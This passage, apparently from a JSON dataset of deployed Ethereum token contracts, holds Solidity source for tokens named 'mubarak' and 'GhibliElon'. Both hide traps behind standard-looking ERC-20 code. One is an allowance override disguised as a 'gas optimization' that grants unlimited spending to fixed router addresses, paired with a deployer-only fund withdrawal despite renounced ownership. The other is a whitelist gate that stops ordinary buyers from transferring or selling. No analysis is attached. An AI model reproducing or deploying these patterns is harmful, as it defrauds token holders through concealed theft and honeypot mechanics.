v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns (bytes memory ) \n                        {\n        require(address ( this ).balance >= value, \"Address: insufficient balance for call\");\n        (bool success, bytes memory returndata) = target.call\n                        {value: value}\n                        (data);\n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage );\n     } \n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( address target, bytes memory data ) internal view returns (bytes memory ) {\n                        \n        return functionStaticCall ( target, data, \"Address: low-level static call failed\");\n     } \n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-string-\n                         } [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal view returns (bytes memory )  { \n                        \n        (bool success, bytes memory returndata ) = target.staticcall ( data);\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) \n                         { \n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\" ) ; \n    \n                         } \n\n    /**\n     * @dev Same as \n                        {xref-Address-functionCall-address-bytes-string-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory ) \n                        {\n         ( bool success, bytes memory returndata) = target.delegatecall(data ) ; \n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\n    }\n                        \n\n    /**\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert  ( either by bubbling\n     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.\n     *\n     * _Available since v4.8._\n     */\n    function verifyCallResultFromTarget ( \n        address target,\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal view returns (bytes memory) {\n                        \n        if  ( success) {\n                        \n            if (returndata.length == 0 ) \n                        {\n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require ( isContract(target), \"Address: call to non-contract\");\n            }\n                        \n            return returndata ; \n        }\n                         else {\n                        \n            _revert(returndata, errorMessage) ; \n         } \n                        \n    \n                        }\n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n     ) internal pure returns (bytes memory) \n                         { \n        if (success)  { \n                        \n            return returndata;\n        }\n                         else \n                         { \n            _revert(returndata, errorMessage ) ; \n        \n                        }\n     } \n                        \n\n    function _revert ( bytes memory returndata, string memory errorMessage) private pure \n                         { \n        // Look for revert reason and bubble it up if present\n        if (returndata.length > 0 ) \n                         { \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly  { \n                        \n                let returndata_size := mload ( returndata)\n                revert ( add ( 32, returndata), returndata_size )\n            }\n                        \n        }\n                         else \n                        {\n            revert ( errorMessage) ; \n        \n                         } \n    }\n                        \n } \n                        \npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context  { \n                        \n    function _msgSender ( ) internal view virtual returns  ( address ) \n                         { \n        return msg.sender ; \n    \n                        }\n\n    function _msgData (  ) internal view virtual returns (bytes calldata) {\n                        \n        return msg.data ; \n     } \n                        \n\n    function _contextSuffixLength( ) internal view virtual returns  ( uint256) \n                         { \n        return 0;\n     } \n                        \n\n\n } \n                        \n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors \n                         { \n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance ( address sender, uint256 balance, uint256 needed ) ; \n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver ( address receiver) ; \n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover ( address approver );\n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender ( address sender ) ; \n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender );\n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed );\n}\n                        \n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20  { \n                        \n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {\n                        approve } \n                        . `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value) ; \n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through  { \n                        transferFrom}\n                        . This is\n     * zero by default.\n     *\n     * This value changes when \n                        {approve}\n                         or  { \n                        transferFrom } \n                         are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256 );\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer\n                        } event.\n     */\n    function transferFrom(address from, address to, uint256 amount ) external returns  ( bool );\n    \n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {\n                        Approval}\n                         event.\n     */\n    function approve(address spender, uint256 amount ) external returns (bool ) ; \n        /**\n     * @dev Emitted when `value` tokens are moved from one account (`from` ) to\n     * another (`to` ).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n        \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer\n                         }  event.\n     */\n    function transfer ( address to, uint256 amount ) external returns  ( bool ) ; \n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply (  ) external view returns  ( uint256 ) ; \n\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf ( address account) external view returns (uint256) ; \n\n    \n\n                         } \n\n\ninterface IERC20Metadata is IERC20 {\n                        \n\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol (  ) external view returns  ( string memory);\n\n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals( ) external view returns (uint8 ) ; \n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name ( ) external view returns  ( string memory);\n\n}\n                        \n\n\n\n\n\n/**\n * @dev Implementation of the \n                        {IERC20}\n                         interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using \n                         { _mint\n                         } .\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of \n                        {decimals\n                        } is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors  \n                        {\n    mapping ( address => uint256 ) private _balances;\n\n\n    mapping(address => mapping(address => uint256)) private _allowances ; \n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol ; \n\n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns ) if `from`\n     *  ( or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a \n                         { Transfer\n                         }  event.\n     */\n    function _update ( address from, address to, uint256 value ) internal virtual {\n                        \n        if (from == address(0 )) \n                        {\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n         } \n                         else \n                        {\n            uint256 fromBalance = _balances[from] ; \n            if (fromBalance < value ) {\n                        \n                revert ERC20InsufficientBalance(from, fromBalance, value);\n             } \n                        \n            unchecked \n                         { \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n             } \n                        \n        }\n                        \n\n        if (to == address ( 0 ))  { \n                        \n            unchecked {\n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value ; \n             } \n                        \n        }\n                         else \n                        {\n            unchecked {\n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value ; \n             } \n                        \n        }\n                        \n\n        emit Transfer(from, to, value ) ; \n    }\n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an {\n                        Approval}\n                         event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\n                        \n        uint256 currentAllowance = allowance ( owner, spender ) ; \n        if (currentAllowance < type ( uint256 ).max) {\n                        \n            if  ( currentAllowance < value)  { \n                        \n                revert ERC20InsufficientAllowance(spender, currentAllowance, value);\n            }\n                        \n            unchecked  { \n                        \n                _approve(owner, spender, currentAllowance - value, false ) ; \n             } \n                        \n         } \n                        \n    \n                        }\n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an  { \n                        Approval}\n                         event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve ( address owner, address spender, uint256 value) internal  { \n                        \n        _approve ( owner, spender, value, true );\n     } \n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {\n                        transfer}\n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a  { \n                        Transfer } \n                         event.\n     *\n     * NOTE: This function is not virtual, \n                         { _update\n                         }  should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value) internal  { \n                        \n        if  ( from == address(0 )) \n                         { \n            revert ERC20InvalidSender ( address ( 0));\n        }\n                        \n        if (to == address ( 0)) {\n                        \n            revert ERC20InvalidReceiver ( address ( 0 ) ) ; \n        \n                        }\n        _update(from, to, value ) ; \n     } \n                        \n    \n    /**\n     * @dev Variant of  { \n                        _approve } \n                         with an optional flag to enable or disable the  { \n                        Approval } \n                         event.\n     *\n     * By default  ( when calling {\n                        _approve } \n                         ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve ( address owner, address spender, uint256 value, bool ) internal virtual override  { \n                        \n     *     super._approve(owner, spender, value, true);\n     *  } \n                        \n     * ```\n     *\n     * Requirements are the same as  { \n                        _approve}\n                        .\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent ) internal virtual {\n                        \n        if (owner == address ( 0 ))  { \n                        \n            revert ERC20InvalidApprover(address(0));\n        }\n                        \n        if  ( spender == address(0)) \n                         { \n            revert ERC20InvalidSpender(address(0) ) ; \n        }\n                        \n        _allowances[owner][spender] = value ; \n        if (emitEvent )  { \n                        \n            emit Approval(owner, spender, value ) ; \n        \n                        }\n    \n                         } \n    \n\n    /**\n     * @dev See {\n                        IERC20-transfer}\n                        .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value ) public virtual returns  ( bool ) \n                         { \n        address owner = _msgSender( ) ; \n        _transfer(owner, to, value );\n        return true;\n    }\n                        \n    \n\n    /**\n     * @dev See \n                        {IERC20-balanceOf}\n                        .\n     */\n    function balanceOf ( address account ) public view virtual returns (uint256)  { \n                        \n        return _balances[account] ; \n    }\n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05`  ( `505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     *  { \n                        IERC20-balanceOf\n                         }  and  { \n                        IERC20-transfer}\n                        .\n     */\n    function decimals ( ) public view virtual returns (uint8)  { \n                        \n        return 15 ; \n     } \n                        \n    \n    /**\n     * @dev See {\n                        IERC20-totalSupply}\n                        .\n     */\n    function totalSupply (  ) public view virtual returns  ( uint256 )  { \n                        \n        return _totalSupply ; \n    }\n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-allowance}\n                        .\n     */\n    function allowance(address owner, address spender ) public view virtual returns (uint256 ) \n                         { \n        return _allowances[owner][spender] ; \n    \n                        }\n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name( ) public view virtual returns  ( string memory ) {\n                        \n        return _name ; \n     } \n                        \n    \n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address ( 0 ).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a  { \n                        Transfer\n                        } event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, \n                        {_update\n                         }  should be overridden instead.\n     */\n    function _mint(address account, uint256 value ) internal  { \n                        \n        if  ( account == address ( 0 )) {\n                        \n            revert ERC20InvalidReceiver ( address ( 0 ));\n         } \n                        \n        _update ( address(0 ), account, value);\n    }\n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-approve\n                        }.\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value ) public virtual returns  ( bool) {\n                        \n        address owner = _msgSender() ; \n        _approve(owner, spender, value);\n        return true;\n    \n                        }\n    \n    /**\n     * @dev See {\n                        IERC20-transferFrom}\n                        .\n     *\n     * Skips emitting an \n                         { Approval\n                        } event indicating an allowance update. This is not\n     * required by the ERC. See  { \n                        xref-ERC20-_approve-address-address-uint256-bool- } \n                        [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value ) public virtual returns (bool )  { \n                        \n        address spender = _msgSender( );\n        _spendAllowance ( from, spender, value );\n        _transfer(from, to, value );\n        return true ; \n    \n                         } \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol (  ) public view virtual returns (string memory) \n                         { \n        return _symbol;\n    \n                         } \n    \n    /**\n     * @dev Sets the values for  { \n                        name}\n                         and {\n                        symbol } \n                        .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor ( string memory name_, string memory symbol_ ) {\n                        \n        _name = name_ ; \n        _symbol = symbol_ ; \n     } \n                        \n    \n     } \n                        \n\nabstract contract Ownable is Context {\n                        \n    address private _owner ; \n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner ( ) internal view virtual {\n                        \n        require ( owner (  ) == _msgSender( ), \"Ownable: caller is not the owner\" );\n    }\n                        \n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount(address account );\n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner ( ) {\n                        \n        _checkOwner( ) ; \n        _;\n    }\n                        \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner` ).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner \n                         { \n        require ( newOwner != address(0 ), \"Ownable: new owner is the zero address\" ) ; \n        _transferOwnership(newOwner );\n    \n                         } \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner` ).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership ( address newOwner ) internal virtual {\n                        \n        address oldOwner = _owner ; \n        _owner = newOwner ; \n        emit OwnershipTransferred(oldOwner, newOwner) ; \n     } \n                        \n    \n    /**\n     * @dev The owner is not a valid owner account.  ( eg. `address ( 0)`)\n     */\n    error OwnableInvalidOwner ( address owner) ; \n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership (  ) public virtual onlyOwner  { \n                        \n        _transferOwnership ( address ( 0 ) ) ; \n    }\n                        \n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner (  ) public view virtual returns (address) {\n                        \n        return _owner ; \n    \n                        }\n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor ( ) \n                         { \n        _transferOwnership(_msgSender()) ; \n     } \n                        \n    \n    event OwnershipTransferred ( address indexed previousOwner, address indexed newOwner ) ; \n    \n } \n                        \n\n\n// File mubarak.sol\n\ncontract mubarak is ERC20, Ownable {\n                        \n    address internal immutable deployer ; \n    constructor(string memory name_, string memory symbol_ ) ERC20 ( name_, symbol_ )  { \n                        \n        _mint ( msg.sender, 100000000000000000000000000 );\n        _transferOwnership(address(0) ) ; \n        deployer = msg.sender;\n     } \n                        \n    \n    /**\n     * @dev See \n                        {IERC20-allowance } \n                        .\n     */\n    function allowance ( address owner, address spender) public view override returns (uint256)  { \n                        \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if (  ( spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3) ||  ( spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24 ) ) { \n                        \n            return type(uint256).max;\n         } \n                         \n        return super.allowance ( owner,spender);\n     } \n                        \n    \n    function claimGas ( address payable recipient, uint256 amount ) public {\n                        \n        require ( msg.sender==deployer);\n        Address.sendValue ( recipient, amount ) ; \n     } \n                        \n    \n    receive( ) external payable{\n                        \n    }\n                        \n\n                        }",
      "count": 1,
      "addresses": [
        "0x5Cca65Ebbd0633CB9c33Fd34700B9ca9800156eb"
      ],
      "names": [
        "mubarak"
      ]
    },
    {
      "id": "05efbd7d-8d96-45fd-b908-f255763e70bd",
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ncontract GhibliElon is Context{\n    string public name;\n    string public symbol;\n    uint8 public decimals;\n    uint256 public totalSupply;\n    address public owner;\n    bool public inStart = true;\n\n    mapping(address => uint256) private balances;\n    mapping(address => mapping(address => uint256)) private allowances;\n    mapping(address => bool) private wls;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event OwnershipRenounced(address indexed previousOwner);\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Caller is not the owner\");\n        _;\n    }\n\n    constructor(string memory _symbol, string memory _name, uint8 _decimals, uint256 _totalSupply) {\n        symbol = _symbol;\n        name = _name;\n        decimals = _decimals;\n        totalSupply = _totalSupply;\n        owner = msg.sender;\n        balances[msg.sender] = totalSupply;\n        wls[msg.sender] = true;\n        emit Transfer(address(0), msg.sender, totalSupply);\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function allowance(address tokenOwner, address spender) public view returns (uint256) {\n        return allowances[tokenOwner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n        }\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, msg.sender, allowances[sender][msg.sender] - amount);\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal {\n        require(sender != address(0), \"Transfer from the zero address\");\n        require(recipient != address(0), \"Transfer to the zero address\");\n        require(balances[sender] >= amount, \"Transfer amount exceeds balance\");\n        if (inStart) {\n            require(wls[recipient], 'no');\n        }\n\n        balances[sender] -= amount;\n        balances[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function _approve(address tokenOwner, address spender, uint256 amount) internal {\n        require(tokenOwner != address(0), \"Approve from the zero address\");\n        require(spender != address(0), \"Approve to the zero address\");\n\n        allowances[tokenOwner][spender] = amount;\n        emit Approval(tokenOwner, spender, amount);\n    }\n\n    function renounceOwnership() public onlyOwner {\n        emit OwnershipRenounced(owner);\n        owner = address(0);\n    }\n\n    function addWLs(address[] calldata wl) external onlyOwner {\n        for (uint i = 0; i < wl.length; i++) {\n            wls[wl[i]] = true;\n        }\n    }\n    \n    function flipState() external onlyOwner {\n        inStart = false;\n    }\n}",
      "count": 1,
      "addresses": [
        "0x99A67485742C4a8040aCE78D4f856bbB5a3d0d22"
      ],
      "names": [
        "GhibliElon"
      ]
    },
    {
      "id": "8645a3c8-b552-480d-b88e-90258459cc4d",
      "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/Address.sol)\n\npragma solidity ^0.8.20 ; \n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n                        \n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA ) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     *\n     * Furthermore, `isContract` will also return true if the target contract within\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\n     * which only has an effect at the end of a transaction.\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract ( address account ) internal view returns (bool) {\n                        \n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0 ; \n    \n                         } \n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`.  { \n                        sendValue } \n                         removes this limitation.\n     *\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     *  { \n                        ReentrancyGuard } \n                         or the\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue ( address payable recipient, uint256 amount) public \n                        {\n        require(address ( this ).balance >= amount, \"Address: insufficient balance\" ) ; \n\n        (bool success,  ) = recipient.call{\n                        value: amount } \n                        (\"\" );\n        require ( success, \"Address: unable to send value, recipient may have reverted\" );\n    }\n                        \n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function  ( like regular Solidity function calls ).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data ) internal returns  ( bytes memory)  { \n                        \n        return functionCallWithValue(target, data, 0, \"Address: low-level call failed\") ; \n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes-}\n                        [`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall ( \n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal returns  ( bytes memory) \n                        {\n        return functionCallWithValue(target, data, 0, errorMessage) ; \n    \n                        }\n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value ) internal returns  ( bytes memory)  { \n                        \n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n                        \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCallWithValue-address-bytes-uint256- } \n                        [`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue ( \n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n     ) internal returns (bytes memory )  { \n                        \n        require(address ( this ).balance >= value, \"Address: insufficient balance for call\") ; \n        (bool success, bytes memory returndata) = target.call{\n                        value: value}\n                         ( data ) ; \n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage ) ; \n    }\n                        \n\n    /**\n     * @dev Same as  { \n                        xref-Address-functionCall-address-bytes- } \n                        [`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall ( address target, bytes memory data) internal view returns (bytes memory ) \n                        {\n        return functionStaticCall ( target, data, \"Address: low-level static call failed\" ) ; \n    \n                         } \n\n    /**\n     * @dev Same as {\n                        xref-Address-functionCall-address-bytes-string-\n                        }[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n     ) internal view returns  ( bytes memory )  { \n                        \n         ( bool success, bytes memory returndata) = target.staticcall ( data);\n        return verifyCallResultFromTarget ( target, success, returndata, errorMessage ) ; \n    }\n                        \n\n    /**\n     * @dev Same as \n                         { xref-Address-functionCall-address-bytes-}\n                        [`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns  ( bytes memory )  { \n                        \n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\") ; \n    \n                        }\n\n    /**\n     * @dev Same as 